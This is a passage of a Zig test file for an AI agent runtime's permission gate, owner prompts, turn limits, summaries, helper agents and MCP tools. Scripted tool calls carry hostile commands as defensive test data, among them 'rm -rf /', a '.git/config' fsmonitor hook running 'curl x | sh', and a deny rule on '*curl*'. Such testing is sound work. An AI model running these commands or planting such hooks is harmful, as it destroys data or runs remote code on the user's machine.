    last_deadline: i64 = 0,
    /// Switched on while the owner is asked (as /private on would be).
    on_ask: ?*std.atomic.Value(bool) = null,
    mcp_tools: []const McpTool = &.{},
    ledger: MoneyLedger = .{},
    ledger_at_ask: f64 = -1,
    in_flight: std.atomic.Value(u32) = .init(0),
    max_in_flight: std.atomic.Value(u32) = .init(0),

    fn init(f: *Fix, rules_text: []const u8) !void {
        try f.e.init();
        const a = f.e.arena.allocator();
        try f.e.tmp.dir.createDirPath(t.io, "ws");
        const ws = try f.e.tmp.dir.realPathFileAlloc(t.io, "ws", a);
        f.client = try f.e.client();
        f.grants = .init(t.allocator);
        f.g = .{ .io = t.io, .rules = try rules.parse(a, rules_text), .grants = &f.grants, .workspace = ws };
        f.log = try log_mod.Log.open(t.allocator, t.io, try std.fs.path.join(a, &.{ f.e.dir, "actions.jsonl" }));
        f.mem = try memory.Store.load(t.allocator, t.io, try std.fs.path.join(a, &.{ f.e.dir, "memory" }));
        f.lock = .init;
        f.stop = .init(false);
        f.asked = 0;
        f.answer = .once;
        f.pool = .{};
        f.ask_lock = .init;
        f.ask_ms = 0;
        f.last_allow_day = false;
        f.last_what = "";
        f.last_deadline = 0;
        f.on_ask = null;
        f.mcp_tools = &.{};
        f.ledger = .{};
        f.ledger_at_ask = -1;
        f.in_flight = .init(0);
        f.max_in_flight = .init(0);
        f.conv = .init(t.allocator);
        f.run = .{
            .gpa = t.allocator,
            .io = t.io,
            .client = &f.client,
            .gate = &f.g,
            .log = &f.log,
            .mem = &f.mem,
            .lock = &f.lock,
            .env = .{ .gpa = t.allocator, .io = t.io, .workspace = ws, .stop = &f.stop },
            .limits = .{},
            .asker = .{ .ctx = f, .ask = askFn },
        };
    }

    fn askFn(ctx: *anyopaque, q: Question) Answer {
        const f: *Fix = @ptrCast(@alignCast(ctx));
        f.last_what = f.e.arena.allocator().dupe(u8, q.text) catch "";
        f.last_deadline = q.deadline_s;
        f.last_allow_day = q.allow_day;
        if (f.on_ask) |flag| flag.store(true, .release);
        f.ledger_at_ask = f.ledger.sum();
        const now_in = f.in_flight.fetchAdd(1, .acq_rel) + 1;
        _ = f.max_in_flight.fetchMax(now_in, .acq_rel);
        if (f.ask_ms > 0) t.io.sleep(.fromMilliseconds(f.ask_ms), .awake) catch {};
        f.asked += 1;
        _ = f.in_flight.fetchSub(1, .acq_rel);
        return f.answer;
    }

    fn deinit(f: *Fix) void {
        f.conv.deinit();
        f.mem.deinit();
        f.log.close();
        f.grants.deinit();
        f.client.deinit();
        f.e.deinit();
    }

    fn say(f: *Fix, text: []const u8) !TurnResult {
        return turn(&f.run, &f.conv, text, true);
    }

    fn logText(f: *Fix) ![]u8 {
        return f.e.tmp.dir.readFileAlloc(t.io, "actions.jsonl", f.e.arena.allocator(), .unlimited);
    }
};

test "plain_answer_one_call" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, model.textReply("Hi, owner."));
    const r = try f.say("hello");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Hi, owner.", r.text);
    try t.expectEqual(1, f.e.server.modelRequests());
    try t.expectEqual(null, r.ended_by);
}

test "tool_call_then_answer" {
    var f: Fix = undefined;
    try f.init("allow write_file *\n");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"a.txt\",\"content\":\"hi\"}"));
    try f.e.script(2, model.textReply("Written."));
    const r = try f.say("write a file");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Written.", r.text);
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "\"tool_result\",\"tool_use_id\":\"tu_1\"") != null);
    try t.expect(std.mem.indexOf(u8, req2, "wrote 2 bytes to a.txt") != null);
    const lt = try f.logText();
    try t.expect(std.mem.indexOf(u8, lt, "\"kind\":\"gate\"") != null);
    try t.expect(std.mem.indexOf(u8, lt, "\"kind\":\"tool\"") != null);
}

test "tool_output_that_is_not_utf8_reaches_the_model_as_valid_json" {
    if (@import("builtin").os.tag == .windows) return error.SkipZigTest;
    var f: Fix = undefined;
    try f.init("allow shell *\n");
    defer f.deinit();
    // a lone continuation byte, then a sequence cut off at the end
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"printf 'a\\\\200b\\\\303'\"}"));
    try f.e.script(2, model.textReply("read it"));
    try f.e.script(3, model.textReply("and the next turn works"));
    const r1 = try f.say("print bytes");
    freeResult(&f.run, r1);
    const a = f.e.arena.allocator();
    const req2 = try f.e.request(2);
    try t.expect(jv.parse(a, req2) != null);
    try t.expect(std.mem.indexOf(u8, req2, "a\u{fffd}b\u{fffd}") != null);
    const r2 = try f.say("next");
    defer freeResult(&f.run, r2);
    try t.expectEqualStrings("and the next turn works", r2.text);
    try t.expect(jv.parse(a, try f.e.request(3)) != null);
    // every log line is JSON too
    var lines = std.mem.splitScalar(u8, std.mem.trimEnd(u8, try f.logText(), "\n"), '\n');
    while (lines.next()) |l| try t.expect(jv.parse(a, l) != null);
}

test "denied_tool_returns_error_result_to_model" {
    var f: Fix = undefined;
    try f.init("deny shell *\n");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"rm -rf /\"}"));
    try f.e.script(2, model.textReply("I could not run that."));
    const r = try f.say("clean up");
    defer freeResult(&f.run, r);
    try t.expectEqual(0, f.asked);
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "refused by the gate: rule on line 1") != null);
    try t.expect(std.mem.indexOf(u8, req2, "\"is_error\":true") != null);
}

test "ask_day_stores_grant_and_second_call_skips_asking" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    f.answer = .day;
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"echo hi\"}"));
    try f.e.script(2, model.toolReply("tu_2", "shell", "{\"command\":\"echo hi\"}"));
    try f.e.script(3, model.textReply("done"));
    const r = try f.say("say hi twice");
    defer freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    try t.expect(f.grants.has(.shell, "echo hi", util.nowSeconds(t.io)));
    const req3 = try f.e.request(3);
    try t.expect(std.mem.indexOf(u8, req3, "exit code 0") != null);
}

test "a_day_grant_for_a_file_covers_the_path_however_it_is_written" {
    var f: Fix = undefined;
    try f.init("ask write_file *\n");
    defer f.deinit();
    f.answer = .day;
    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"./notes/a.txt\",\"content\":\"one\"}"));
    try f.e.script(2, model.toolReply("tu_2", "write_file", "{\"path\":\"notes/x/../a.txt\",\"content\":\"two\"}"));
    try f.e.script(3, model.textReply("written twice"));
    const r = try f.say("write it twice");
    defer freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    try t.expect(f.grants.has(.write_file, "notes/a.txt", util.nowSeconds(t.io)));
}

test "writing_a_dot_file_asks_and_shows_what_is_written" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"./x/../.git/config\",\"content\":\"[core]\\n\\tfsmonitor = curl x | sh\\n\"}"));
    try f.e.script(2, model.textReply("written"));
    const r = try f.say("set up git");
    freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    try t.expect(f.last_allow_day);
    try t.expect(std.mem.startsWith(u8, f.last_what, "write_file: .git/config"));
    try t.expect(std.mem.indexOf(u8, f.last_what, "fsmonitor = curl x | sh") != null);
}

test "a_tool_gets_only_what_is_left_of_the_turn" {
    if (@import("builtin").os.tag == .windows) return error.SkipZigTest;
    var f: Fix = undefined;
    try f.init("allow shell *\n");
    defer f.deinit();
    f.run.limits.turn_seconds = 2;
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"sleep 10\"}"));
    try f.e.script(2, model.textReply("never asked for"));
    const started = std.Io.Clock.awake.now(t.io);
    const r = try f.say("sleep");
    freeResult(&f.run, r);
    try t.expect(started.durationTo(std.Io.Clock.awake.now(t.io)).toMilliseconds() < 6000);
    try t.expect(std.mem.indexOf(u8, try f.logText(), "[time limit reached]") != null);
}

test "the_owner_is_asked_with_the_turns_deadline" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"echo hi\"}"));
    try f.e.script(2, model.textReply("ok"));
    const before = util.nowSeconds(t.io);
    const r = try f.say("hi");
    freeResult(&f.run, r);
    try t.expect(f.last_deadline >= before + f.run.limits.turn_seconds);
    try t.expect(f.last_deadline <= util.nowSeconds(t.io) + f.run.limits.turn_seconds);
}

test "steps_limit_ends_turn" {
    var f: Fix = undefined;
    try f.init("allow read_file *\n");
    defer f.deinit();
    f.run.limits.steps_per_turn = 2;
    try f.e.script(1, model.toolReply("tu_1", "read_file", "{\"path\":\"x\"}"));
    try f.e.script(2, model.toolReply("tu_2", "read_file", "{\"path\":\"x\"}"));
    try f.e.script(3, model.textReply("never"));
    const r = try f.say("loop");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Step limit reached for this turn.", r.ended_by.?);
    try t.expectEqual(2, f.e.server.modelRequests());
}

test "budget_spent_ends_turn_with_message" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, "{\"status\":402}");
    const r = try f.say("hello");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Model budget used up.", r.text);
    try t.expectEqual(1, f.e.server.modelRequests());
}

test "a_turn_without_a_key_says_model_calls_are_refused" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    f.client.key = "";
    const r = try f.say("hello");
    defer freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, r.text, "no omnigate key is stored") != null);
    try t.expectEqual(0, f.e.server.modelRequests());
}

test "a_slow_model_call_ends_with_the_turn" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    f.run.limits.turn_seconds = 2;
    try f.e.script(1, comptime "{\"delay_ms\":6000," ++ model.textReply("too late")[1..]);
    const start = Io.Clock.awake.now(t.io);
    const r = try f.say("hello");
    defer freeResult(&f.run, r);
    try t.expect(start.durationTo(Io.Clock.awake.now(t.io)).toMilliseconds() < 4500);
    try t.expectEqualStrings("Time limit reached for this turn.", r.text);
    try t.expectEqual(1, f.e.server.modelRequests());
}

test "a_turn_the_model_api_refuses_is_dropped" {
    var f: Fix = undefined;
    try f.init("allow write_file *\n");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "write_file", "{\"path\":\"a.txt\",\"content\":\"hi\"}"));
    // the request with the tool's result is refused as invalid
    try f.e.script(2, "{\"status\":400}");
    try f.e.script(3, model.textReply("fine again"));
    const r1 = try f.say("first message");
    defer freeResult(&f.run, r1);
    // the owner is told what the API said and what the agent will not remember
    try t.expect(std.mem.indexOf(u8, r1.text, "refused the request: scripted error") != null);
    try t.expect(std.mem.indexOf(u8, r1.text, "1 tool call") != null);
    try t.expectEqual(0, f.conv.turns.items.len);
    // so the next request is not refused for it again
    const r2 = try f.say("second message");
    defer freeResult(&f.run, r2);
    try t.expectEqualStrings("fine again", r2.text);
    try t.expect(std.mem.indexOf(u8, try f.e.request(3), "first message") == null);
}

test "tool_calls_in_a_reply_cut_at_max_tokens_are_not_run" {
    var f: Fix = undefined;
    try f.init("allow write_file *\n");
    defer f.deinit();
    // the reply ran out of room in the middle of its call
    try f.e.script(1, "{\"content\":[{\"type\":\"tool_use\",\"id\":\"tu_1\",\"name\":\"write_file\",\"input\":{\"path\":\"a.txt\",\"content\":\"the start of\"}}],\"stop_reason\":\"max_tokens\"}");
    try f.e.script(2, model.textReply("I will write it in parts."));
    const r = try f.say("write a long file");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("I will write it in parts.", r.text);
    try t.expectError(error.FileNotFound, f.e.tmp.dir.statFile(t.io, "ws/a.txt", .{}));
    // the model is told, in the call's own result
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "\"tool_use_id\":\"tu_1\",\"content\":\"not run: your reply was cut off") != null);
}

test "stop_before_next_call" {
    var f: Fix = undefined;
    try f.init("allow read_file *\n");
    defer f.deinit();
    try f.e.script(1, model.toolReply("tu_1", "read_file", "{\"path\":\"x\"}"));
    try f.e.script(2, model.textReply("never"));
    f.stop.store(true, .release);
    const r = try f.say("go");
    defer freeResult(&f.run, r);
    try t.expect(r.stopped);
    try t.expectEqual(0, f.e.server.modelRequests());
}

test "pinned_item_present_after_trim" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const p = try f.mem.add("Always ask before deleting anything", null, util.nowSeconds(t.io));
    _ = try f.mem.setPinned(p.id, true);
    f.run.limits.conversation_bytes = 300;
    const filler = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    var i: u32 = 1;
    while (i <= 4) : (i += 1) try f.e.script(i, model.textReply(filler));
    i = 0;
    while (i < 4) : (i += 1) {
        const r = try f.say("tell me something long");
        freeResult(&f.run, r);
    }
    try t.expect(f.conv.dropped > 0);
    try t.expectEqual(1, f.conv.turns.items.len);
    const req4 = try f.e.request(4);
    try t.expect(std.mem.indexOf(u8, req4, "Always ask before deleting anything") != null);
    try t.expect(std.mem.indexOf(u8, req4, "earlier turns of this conversation were dropped") != null);
}

test "owner_mention_raises_item_agent_text_does_not" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const res = try f.mem.add("kayak trip norway fjords", null, util.nowSeconds(t.io) - 86400);
    const it = f.mem.find(res.id).?;
    try f.e.script(1, model.textReply("Sure."));
    try f.e.script(2, model.textReply("Your kayak trip to norway fjords sounds great."));
    const r1 = try f.say("planning the kayak trip to norway");
    freeResult(&f.run, r1);
    try t.expectEqual(2, it.mentions.items.len);
    const r2 = try f.say("ok");
    freeResult(&f.run, r2);
    try t.expectEqual(2, it.mentions.items.len);
}

test "a_redirect_to_another_host_is_asked_like_a_fetch" {
    var f: Fix = undefined;
    try f.init("allow fetch http://127.0.0.1:*\n");
    defer f.deinit();
    const a = f.e.arena.allocator();
    try f.e.tmp.dir.writeFile(t.io, .{ .sub_path = "pages/far.html", .data = "<p>Far away</p>" });
    try f.e.tmp.dir.writeFile(t.io, .{ .sub_path = "pages/a.redirect", .data = try std.fmt.allocPrint(a, "302 http://localhost:{d}/page/far.html", .{f.e.server.port}) });
    try f.e.script(1, try std.fmt.allocPrint(a, "{{\"content\":[{{\"type\":\"tool_use\",\"id\":\"tu_1\",\"name\":\"fetch\",\"input\":{{\"url\":\"http://127.0.0.1:{d}/page/a\"}}}}],\"stop_reason\":\"tool_use\"}}", .{f.e.server.port}));
    try f.e.script(2, model.textReply("Could not follow it."));
    f.answer = .deny;
    const r = try f.say("read it");
    defer freeResult(&f.run, r);
    // the address asked for is allowed by the rule; the redirect's host is asked
    try t.expectEqual(1, f.asked);
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "was not followed: denied by the owner") != null);
    try t.expect(std.mem.indexOf(u8, req2, "Far away") == null);
}

test "remember_repeating_an_item_is_not_a_mention" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const res = try f.mem.add("The owner follows Zig compiler releases", null, util.nowSeconds(t.io) - 86400);
    try f.e.script(1, model.toolReply("tu_1", "remember", "{\"text\":\"The owner follows zig compiler releases closely\"}"));
    try f.e.script(2, model.textReply("Noted."));
    const r = try f.say("ok");
    defer freeResult(&f.run, r);
    try t.expectEqual(1, f.mem.find(res.id).?.mentions.items.len);
}

test "empty_answer_is_not_kept" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, "{\"content\":[],\"stop_reason\":\"end_turn\"}");
    try f.e.script(2, model.textReply("fine now"));
    const r1 = try f.say("hello");
    freeResult(&f.run, r1);
    const r2 = try f.say("hello again");
    defer freeResult(&f.run, r2);
    try t.expectEqualStrings("fine now", r2.text);
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "\"role\":\"assistant\",\"content\":[]") == null);
}

// ---- helpers (delegate), summaries ----

fn withHelpers(f: *Fix) !void {
    f.run.model_cfg = .{ .url = try f.e.url(), .key = "og-test-key", .main = "claude-test", .worker = "claude-worker", .memory = "claude-mem", .max_tokens = 100 };
    f.run.pool = &f.pool;
    f.run.ask_lock = &f.ask_lock;
}

test "delegate_runs_helpers_in_parallel_and_returns_their_answers" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"find a\"},{\"task\":\"find b\"},{\"task\":\"find c\",\"strong\":true}]}"));
    for (2..5) |n| try f.e.script(@intCast(n), "{\"delay_ms\":2000,\"content\":[{\"type\":\"text\",\"text\":\"helper answer\"}],\"stop_reason\":\"end_turn\",\"usage\":{\"input_tokens\":7,\"output_tokens\":3}}");
    try f.e.script(5, model.textReply("Combined."));
    const started = std.Io.Clock.awake.now(t.io);
    const r = try f.say("research three things");
    defer freeResult(&f.run, r);
    const ms = started.durationTo(std.Io.Clock.awake.now(t.io)).toMilliseconds();
    try t.expectEqualStrings("Combined.", r.text);
    try t.expect(ms < 4000); // three 2 s helpers at once; one after another would take 6 s or more
    const last = try f.e.request(5);
    try t.expectEqual(3, std.mem.count(u8, last, "helper answer"));
    var workers: u32 = 0;
    var strong: u32 = 0;
    for (2..5) |n| {
        const req = try f.e.request(@intCast(n));
        if (std.mem.indexOf(u8, req, "\"model\":\"claude-worker\"") != null) workers += 1;
        if (std.mem.indexOf(u8, req, "\"model\":\"claude-test\"") != null) strong += 1;
        // helpers cannot delegate, remember or write skills
        try t.expect(std.mem.indexOf(u8, req, "\"name\":\"delegate\"") == null);
        try t.expect(std.mem.indexOf(u8, req, "\"name\":\"remember\"") == null);
        // and never see the owner's conversation
        try t.expect(std.mem.indexOf(u8, req, "research three things") == null);
    }
    try t.expectEqual(2, workers);
    try t.expectEqual(1, strong);
    try t.expect(std.mem.indexOf(u8, try f.logText(), "chat/h3") != null);
}

test "helper_stops_at_its_token_limit" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.run.agents.tokens = 15;
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"dig\",\"tools\":[\"recall\"]}]}"));
    const used10 = "{\"content\":[{\"type\":\"tool_use\",\"id\":\"ID\",\"name\":\"recall\",\"input\":{\"query\":\"x\"}}],\"stop_reason\":\"tool_use\",\"usage\":{\"input_tokens\":10,\"output_tokens\":2}}";
    try f.e.script(2, used10);
    try f.e.script(3, used10);
    try f.e.script(4, model.textReply("Parent done."));
    const r = try f.say("dig");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Parent done.", r.text);
    // the helper made two calls, not a third: the parent's is the fourth
    try t.expect(std.mem.indexOf(u8, try f.e.request(4), "Token limit") != null);
}

test "helpers_ask_the_owner_one_at_a_time" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.ask_ms = 150;
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"one\",\"tools\":[\"shell\"]},{\"task\":\"two\",\"tools\":[\"shell\"]}]}"));
    try f.e.script(2, model.toolReply("w1", "shell", "{\"command\":\"echo one\"}"));
    try f.e.script(3, model.toolReply("w2", "shell", "{\"command\":\"echo two\"}"));
    try f.e.script(4, model.textReply("done"));
    try f.e.script(5, model.textReply("done"));
    try f.e.script(6, model.textReply("Both done."));
    const r = try f.say("run two");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Both done.", r.text);
    try t.expectEqual(2, f.asked);
    try t.expectEqual(1, f.max_in_flight.load(.acquire));
}

test "a_helpers_question_after_the_deadline_is_not_asked" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.run.limits.turn_seconds = 2;
    // the first question is answered after the turn's end; the second
    // helper's question waits behind it and can't be answered in time
    f.ask_ms = 2500;
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"one\",\"tools\":[\"shell\"]},{\"task\":\"two\",\"tools\":[\"shell\"]}]}"));
    try f.e.script(2, model.toolReply("w1", "shell", "{\"command\":\"echo one\"}"));
    try f.e.script(3, model.toolReply("w2", "shell", "{\"command\":\"echo two\"}"));
    for (4..8) |n| try f.e.script(@intCast(n), model.textReply("done"));
    const r = try f.say("run two");
    freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    const lt = try f.logText();
    try t.expect(std.mem.indexOf(u8, lt, "no time left in the turn to ask") != null);
    // the one answered after the end is not run either, and the log says so
    try t.expect(std.mem.indexOf(u8, lt, "not run: no time left in this turn") != null);
}

test "long_conversation_is_summarised_not_dropped" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    // each turn is about 180 bytes with its context: five fit, the sixth crosses
    f.run.limits.conversation_bytes = 1000;
    for (1..9) |n| try f.e.script(@intCast(n), model.textReply("It will be sunny and mild with light wind in the afternoon."));
    for (0..6) |_| {
        const r = try f.say("tell me about the weather in the mountains this weekend please");
        freeResult(&f.run, r);
    }
    // six turn calls and one summary call
    try t.expectEqual(7, f.e.server.modelRequests());
    try t.expect(f.conv.summary != null);
    try t.expectEqual(4, f.conv.turns.items.len);
    try t.expect(std.mem.indexOf(u8, try f.e.request(7), "\"model\":\"claude-mem\"") != null);
    const r = try f.say("and next week?");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(8), "Summary of the earlier conversation") != null);
}

test "turns_dropped_after_a_summary_are_logged_and_said" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.run.limits.conversation_bytes = 1000;
    const a = f.e.arena.allocator();
    for (1..6) |n| try f.e.script(@intCast(n), model.textReply("It will be sunny."));
    // the sixth answer is long: after the summary the newest turns alone
    // are still over the limit
    const long: [900]u8 = @splat('w');
    try f.e.script(6, try std.fmt.allocPrint(a, "{{\"content\":[{{\"type\":\"text\",\"text\":\"{s}\"}}],\"stop_reason\":\"end_turn\"}}", .{&long}));
    try f.e.script(7, model.textReply("The owner asked about the weather."));
    try f.e.script(8, model.textReply("ok"));
    for (0..6) |_| {
        const r = try f.say("and the weather?");
        freeResult(&f.run, r);
    }
    try t.expect(f.conv.summary != null);
    const r = try f.say("thanks");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.logText(), "\"event\":\"dropped unsummarised\"") != null);
    const req8 = try f.e.request(8);
    try t.expect(std.mem.indexOf(u8, req8, "Summary of the earlier conversation") != null);
    try t.expect(std.mem.indexOf(u8, req8, "dropped without being summarised") != null);
}

test "a_summary_too_long_to_send_keeps_the_newest_turns" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    // about 2 KB a turn: the turns to summarise are over the 60 KB sent
    f.run.limits.conversation_bytes = 72000;
    const a = f.e.arena.allocator();
    const filler: [1990]u8 = @splat('x');
    for (1..41) |n| try f.e.script(@intCast(n), try std.fmt.allocPrint(a, "{{\"content\":[{{\"type\":\"text\",\"text\":\"answer-{d:0>2} {s}\"}}],\"stop_reason\":\"end_turn\"}}", .{ n, &filler }));
    var asked: u32 = 0;
    while (f.conv.summary == null and asked < 40) : (asked += 1) {
        const r = try f.say(try std.fmt.allocPrint(a, "question {d:0>2}", .{asked + 1}));
        freeResult(&f.run, r);
    }
    try t.expect(f.conv.summary != null);
    // the summary call came right after the last turn's
    const req = try f.e.request(asked + 1);
    try t.expect(std.mem.indexOf(u8, req, "\"model\":\"claude-mem\"") != null);
    // all but the last 4 turns were summarised: the newest of them is in
    const newest = try std.fmt.allocPrint(a, "answer-{d:0>2} ", .{asked - 4});
    try t.expect(std.mem.indexOf(u8, req, newest) != null);
    // and the oldest made room for it, said so
    try t.expect(std.mem.indexOf(u8, req, "answer-01 ") == null);
    try t.expect(std.mem.indexOf(u8, req, "older turns left out") != null);
    // those are gone without a summary, and the model is told
    try t.expect(f.conv.lost > 0);
    try f.e.script(asked + 2, model.textReply("ok"));
    const r = try f.say("thanks");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(asked + 2), "dropped without being summarised") != null);
}

// ---- MCP tools and money ----

const mcp_fake_path = if (@import("builtin").is_test) @import("build_options").fake_path else "";

/// The fake server's tools as the mcp.ini section `[fake]` with the lines
/// `extra` makes them; they become the run's MCP tools.
fn fakeTools(f: *Fix, s: *mcp.Server, extra: []const u8) !Offer {
    const a = f.e.arena.allocator();
    const cfgs = try mcp.parseConfig(a, try std.fmt.allocPrint(a, "[fake]\ncommand = x\n{s}", .{extra}));
    const offer = try mcpTools(a, s, cfgs[0], f.run.money, &.{});
    f.mcp_tools = offer.tools;
    f.run.mcp = f.mcp_tools;
    return offer;
}

/// The fake MCP server, started under `name`.
fn startFake(f: *Fix, name: []const u8) !*mcp.Server {
    const a = f.e.arena.allocator();
    const fake = try Io.Dir.cwd().realPathFileAlloc(t.io, mcp_fake_path, a);
    return mcp.Server.start(t.allocator, t.io, .{ .name = name, .command = try std.fmt.allocPrint(a, "\"{s}\" --mcp", .{fake}), .secrets = &.{}, .money = &.{} }, .{
        .cwd = f.run.env.workspace,
        .path_var = "/usr/bin:/bin",
        .home = "/tmp",
        .secret_values = &.{},
    });
}

fn withMcp(f: *Fix, money: bool) !*mcp.Server {
    const s = try startFake(f, "fake");
    _ = try fakeTools(f, s, if (money) "money = echo, fail\namount = amount\n" else "");
    f.run.money_ledger = &f.ledger;
    return s;
}

test "mcp_tool_is_offered_and_runs_after_the_gate" {
    var f: Fix = undefined;
    try f.init("allow mcp fake/echo *\n");
    defer f.deinit();
    const s = try withMcp(&f, false);
    defer s.deinit();
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"from-mcp\"}"));
    try f.e.script(2, model.textReply("Echoed."));
    const r = try f.say("echo it");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Echoed.", r.text);
    try t.expect(std.mem.indexOf(u8, try f.e.request(1), "\"name\":\"fake__echo\"") != null);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "from-mcp") != null);
    try t.expectEqual(0, f.asked);
}

test "an_mcp_answer_cut_at_the_limit_does_not_show_half_a_secret" {
    var f: Fix = undefined;
    try f.init("allow mcp fake/echo *\n");
    defer f.deinit();
    const s = try withMcp(&f, false);
    defer s.deinit();
    f.run.env.secrets = &.{.{ .name = "broker", .value = "123456:SECRET-broker-key-value" }};
    f.run.env.tool_output_bytes = 100;
    // the server says it back: 90 bytes, then the key across the cut at 100
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"" ++ ("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") ++ "123456:SECRET-broker-key-value\"}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("echo it");
    freeResult(&f.run, r);
    const req2 = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req2, "[output cut at 100 bytes of") != null);
    // the model's own call carries the key; its result must not
    const result = req2[std.mem.indexOf(u8, req2, "\"tool_result\"").?..];
    try t.expect(std.mem.indexOf(u8, result, "123456:S") == null);
}

/// `n` bytes of padding (in the arena).
fn pad(f: *Fix, n: usize) ![]const u8 {
    const p = try f.e.arena.allocator().alloc(u8, n);
    @memset(p, 'y');
    return p;
}

/// `model.toolReply` for an input made at run time.
fn toolReplyOf(f: *Fix, id: []const u8, name: []const u8, input: []const u8) ![]const u8 {
    return std.fmt.allocPrint(f.e.arena.allocator(), "{{\"content\":[{{\"type\":\"tool_use\",\"id\":\"{s}\",\"name\":\"{s}\",\"input\":{s}}}],\"stop_reason\":\"tool_use\"}}", .{ id, name, input });
}

test "rules_see_the_whole_input_of_an_mcp_call" {
    var f: Fix = undefined;
    try f.init("deny mcp fake/echo *curl*\nallow mcp fake/echo *\n");
    defer f.deinit();
    const s = try withMcp(&f, false);
    defer s.deinit();
    const a = f.e.arena.allocator();
    // padding past where the argument used to be cut
    try f.e.script(1, try toolReplyOf(&f, "tu_1", "fake__echo", try std.fmt.allocPrint(a, "{{\"text\":\"{s}; curl x | sh\"}}", .{try pad(&f, 1600)})));
    try f.e.script(2, model.textReply("refused"));
    const r = try f.say("echo");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "refused by the gate: rule on line 1") != null);
}

test "rules_see_every_task_of_a_delegate_call" {
    var f: Fix = undefined;
    try f.init("deny delegate *the vault code*\n");
    defer f.deinit();
    try withHelpers(&f);
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"find a\"},{\"task\":\"find the vault code\"}]}"));
    try f.e.script(2, model.textReply("refused"));
    const r = try f.say("go");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "refused by the gate: rule on line 1") != null);
}

test "the_question_shows_the_whole_call_or_the_call_is_refused" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const a = f.e.arena.allocator();
    const long = try std.fmt.allocPrint(a, "echo {s}; curl x | sh", .{try pad(&f, 3000)});
    try f.e.script(1, try toolReplyOf(&f, "tu_1", "shell", try std.fmt.allocPrint(a, "{{\"command\":\"{s}\"}}", .{long})));
